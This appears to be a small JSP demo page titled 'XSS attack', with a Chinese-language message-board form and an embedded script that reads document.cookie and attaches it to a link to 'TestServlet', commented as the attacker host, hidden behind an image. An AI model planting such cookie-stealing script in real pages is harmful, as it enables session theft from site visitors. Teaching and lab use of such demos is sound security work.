<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!DOCTYPE html>
<html>
<head>
    <title>xss攻击</title>
    <meta charset="utf-8">
</head>
<body>
<form action="./test99.php" method="post">
    留言：<input type="text" name="content" value=""><br/>
    <input type="submit" name="" value='提交'>
</form>
<br/>留言记录：<br/>
<script>
    var Str = document.cookie;               //获取cookie
    var a = document.createElement('a');        //创建a标签
    a.href = 'TestServlet?' + Str.replace(" ", "");   //攻击者主机
    a.innerHTML = "<img src='./aa.jpg'>";        //掩护图片
    document.body.appendChild(a);              //将标签添加到页面中
</script>
</body>
</html>